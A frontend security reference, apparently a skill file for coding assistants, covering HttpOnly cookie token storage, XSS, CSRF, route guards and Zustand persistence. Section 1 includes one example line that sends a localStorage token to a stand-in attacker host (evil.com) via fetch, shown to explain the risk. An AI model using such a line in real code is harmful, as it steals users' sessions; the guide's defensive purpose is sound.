---
name: frontend-security
description: Frontend/client security — token storage, XSS, CSRF, route guards, and Zustand persistence. Read when building auth flows, storing tokens, or reviewing client-side security.
---

# Frontend Security Best Practices

A reference for building frontend applications (React/Next.js-style SPAs and SSR apps) that resist the most common client-side attack classes: token theft, XSS, CSRF, and route/authorization bypass. Apply this whenever writing or reviewing auth-adjacent frontend code — route guards, API clients, state stores, or anything that touches a session/token.

## Core principle: the browser is hostile territory

Any JavaScript that runs in the browser can be read, and any storage that JavaScript can read can be exfiltrated by an attacker who gets *any* script execution (a single XSS gap, a compromised npm package, a malicious browser extension). Design as if the DOM and JS runtime are compromisable, and put the real trust boundary at the server/network layer.

---

## 1. Token storage — never trust JS-readable storage for auth tokens

**Anti-pattern:** storing access or refresh tokens in `localStorage`, `sessionStorage`, or a plain JS variable/Zustand store, then attaching them manually via `Authorization: Bearer`.

- Any of these are readable by **any** script on the page — including third-party scripts, injected XSS payloads, and malicious dependencies. A single `<script>` injection can `fetch('https://evil.com?t=' + localStorage.getItem('token'))` and the session is gone, silently, with no user-visible symptom.
- This is the #1 root cause of "token theft" incidents in SPAs.

**Best practice: HttpOnly, Secure, SameSite cookies for the session token.**

- Set the auth cookie server-side with:
  - `HttpOnly` — JavaScript cannot read it (`document.cookie` won't show it), which neutralizes token exfiltration via XSS.
  - `Secure` — never sent over plain HTTP.
  - `SameSite=Strict` or `Lax` — the browser withholds the cookie on most cross-site requests, which is your first line of CSRF defense.
  - A scoped `Path` and short `Max-Age`/`exp` for the access cookie; a longer-lived refresh cookie can live on a narrower path (e.g. `/api/auth/refresh`) so it's not sent on every request.
- The browser attaches the cookie automatically — the frontend never touches the token value at all. This is the single biggest mitigation available against client-side token theft.

**If you truly need a bearer token in JS** (e.g. calling a third-party API directly from the browser, or a mobile WebView context):
- Keep it **in memory only** (a module-level variable or a Zustand store *without persistence*, see §5) — never in `localStorage`/`sessionStorage`.
- Accept that a page refresh clears it; re-derive it from the HttpOnly session cookie via a silent `/refresh` call on app bootstrap. This gives you "feels persistent to the user" without ever writing the token to disk-backed storage.

---

## 2. Cross-Site Scripting (XSS)

XSS is what turns "my tokens are in localStorage" from theoretical risk into "an attacker has my token." Defense in depth:

- **Never** use `dangerouslySetInnerHTML` (React) or raw `innerHTML` with anything derived from user input, URL params, or API responses you don't fully control. If you must render rich text/HTML, sanitize with a maintained library (e.g. DOMPurify) and treat the sanitizer's allowlist as the security boundary, not a formatting nicety.
- Never build DOM strings via template-literal concatenation of user data (`el.innerHTML = `<div>${userInput}</div>``). Let the framework's default text-binding (JSX `{value}`, Vue `{{ value }}`) escape it — that's the safe default; only bypass it deliberately and sparingly.
- Avoid `eval`, `new Function(...)`, and dynamic `<script src>` built from user/query data.
- Set a **Content-Security-Policy** header (ideally with a nonce or hash-based `script-src`, avoiding `unsafe-inline`/`unsafe-eval`) — this is your backstop for the XSS you didn't catch in code review.
- Treat every third-party script/tag manager/analytics snippet as a supply-chain risk: pin versions, use Subresource Integrity (`integrity="sha384-..."`) for CDN scripts, and audit what they can reach (they run with full page privileges, including reading any non-HttpOnly cookie or localStorage key).
- Sanitize and validate anything reflected from the URL (query params, hash) before rendering it — reflected XSS via `?redirect=` or `?q=` params is extremely common.

---

## 3. Cross-Site Request Forgery (CSRF)

Relevant mainly when you've correctly moved to cookie-based sessions (§1) — cookies are sent automatically by the browser on *any* request to your domain, including ones triggered by a malicious third-party page.

- `SameSite=Strict`/`Lax` cookies close most CSRF vectors by default in modern browsers — this is why cookie-based auth still needs explicit CSRF handling, not none.
- For state-changing requests (POST/PUT/PATCH/DELETE), use the **double-submit token** or **synchronizer token** pattern: server issues a CSRF token (readable, non-HttpOnly, tied to the session) that the frontend must echo back in a custom header (e.g. `X-CSRF-Token`). Cross-site forms can't read it to replay it.
- Prefer custom headers for your API calls (`X-Requested-With`, `X-CSRF-Token`) over relying on cookies alone — simple cross-site `<form>` submissions can't set custom headers, so requiring one is a cheap, effective CSRF filter even before you add a token.
- Never make state-changing actions reachable via `GET` — GET requests are trivially triggered by an `<img src>` or link on an attacker's page.

---

## 4. Routing: middleware, file-based routing, and URL-based authorization

**Route guards must be enforced where the user cannot bypass them — not just hidden in the UI.**

- Hiding a nav link or conditionally rendering a component is a UX nicety, **not** an authorization control. Anyone can navigate directly to the URL, replay an old bookmark, or call the underlying API. Real authorization always lives server-side (API/middleware), never only in client route guards.
- Use framework routing middleware (e.g. Next.js `middleware.ts`, a top-level layout/loader, or a router guard) as a **UX layer**: redirect unauthenticated users to `/login`, redirect authenticated users away from `/login`, gate whole route trees by role. This runs on every navigation and is the right place to check "is there a valid session cookie" before rendering.
- With **file-based routing**, be deliberate about what lives under public vs. protected route groups (e.g. `(public)/` vs `(app)/` segments) — a file dropped in the wrong folder is a silent auth bypass. Add a lint rule or code-review checklist item for "new route files must declare their auth requirement."
- For **dynamic/URL-based routing** (`/orgs/[orgId]/projects/[projectId]`), never assume the IDs in the URL belong to the current user — that's an [IDOR](https://owasp.org/www-community/attacks/Insecure_Direct_Object_Reference) waiting to happen. The frontend should still call an API that independently verifies the current session is authorized for `orgId`/`projectId`; the URL is just a routing hint, not a trust signal.
- Validate and allowlist redirect targets (`?redirect=/dashboard`) to prevent open-redirect abuse — never `window.location = params.get('redirect')` unchecked; confirm it's a relative, same-origin path.

---

## 5. Client-side state & persistence — Zustand

Zustand (or similar) is the right tool for **UI state and non-sensitive cached data** — not for tokens or anything security-sensitive.

```ts
import { create } from 'zustand'
import { persist, createJSONStorage } from 'zustand/middleware'

// ✅ OK to persist: UI preferences, non-sensitive cached data
interface UIStore {
  theme: 'light' | 'dark'
  sidebarCollapsed: boolean
  setTheme: (t: 'light' | 'dark') => void
}

export const useUIStore = create<UIStore>()(
  persist(
    (set) => ({
      theme: 'light',
      sidebarCollapsed: false,
      setTheme: (theme) => set({ theme }),
    }),
    { name: 'ui-preferences', storage: createJSONStorage(() => localStorage) }
  )
)

// ✅ Auth/session state: in-memory only, NEVER persisted
interface AuthStore {
  user: { id: string; name: string; role: string } | null
  isAuthenticated: boolean
  setUser: (u: AuthStore['user']) => void
  clear: () => void
}

export const useAuthStore = create<AuthStore>((set) => ({
  user: null,
  isAuthenticated: false,
  setUser: (user) => set({ user, isAuthenticated: !!user }),
  clear: () => set({ user: null, isAuthenticated: false }),
}))
// No `persist` middleware here on purpose. Rehydrate `user` on app boot by
// calling an endpoint that reads the HttpOnly session cookie (e.g. GET /api/me),
// not by reading it back out of storage.
```

Rules of thumb:
- **Never** wrap a store holding tokens, raw JWTs, or full user PII in Zustand's `persist` middleware — `persist` writes to `localStorage`/`sessionStorage` by default, which reintroduces the exact XSS-readable-storage problem from §1.
- If a store *must* persist something sensitive-adjacent (e.g. a non-sensitive user id for analytics), use `partialize` to explicitly allowlist only the safe fields, rather than persisting the whole store.
- Derive auth state from the server on load (`/api/me` using the HttpOnly cookie) instead of trusting whatever was last written to client storage — client storage is a cache, not a source of truth.
- Clear all sensitive in-memory state on logout (`store.clear()`) and also trigger the server-side cookie invalidation — clearing only the client store leaves the cookie/session alive.

---

## Quick checklist

- [ ] Access/refresh tokens live in `HttpOnly` + `Secure` + `SameSite` cookies, not `localStorage`
- [ ] CSP header set; no `dangerouslySetInnerHTML`/`innerHTML` with unsanitized input
- [ ] State-changing requests require a CSRF token or custom header, not just a cookie
- [ ] Route guards (middleware) redirect unauthenticated users, but real authorization is re-checked server-side per request
- [ ] Dynamic route params (`orgId`, `userId`, etc.) are never trusted without server-side ownership checks
- [ ] Redirect targets are validated against an allowlist / same-origin check
- [ ] Zustand stores with `persist` never contain tokens or sensitive session data
- [ ] Logout clears both client state and the server-side session/cookie
